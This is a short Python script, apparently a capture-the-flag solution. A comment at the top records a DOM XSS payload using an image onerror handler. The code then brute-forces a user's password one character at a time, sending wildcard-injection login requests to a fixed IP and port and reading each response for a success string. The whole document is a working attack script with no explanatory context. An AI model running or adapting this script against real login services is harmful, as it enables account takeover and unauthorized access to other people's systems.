#DOM XSS found
#Payload: <img src='x' onerror = 'alert(1)'>

import requests

list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
        'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '_', '}', '{', '-', '1', '0', '4']

url = 'http://138.68.131.63:30898/login'
myobj = {'username': 'reese', 'password': 'somevalue'}

result = ''

flag = 1
while flag == 1:
    flag = 0
    for l in list:
        myobj['password'] = result + l + '*'
        r = requests.post(url, data=myobj, proxies = {"http" : "http://127.0.0.1:8080"})

        if ('No search Results' in r.text):
            result += l
            flag = 1
            print(result)
            break
print('Finish!!')
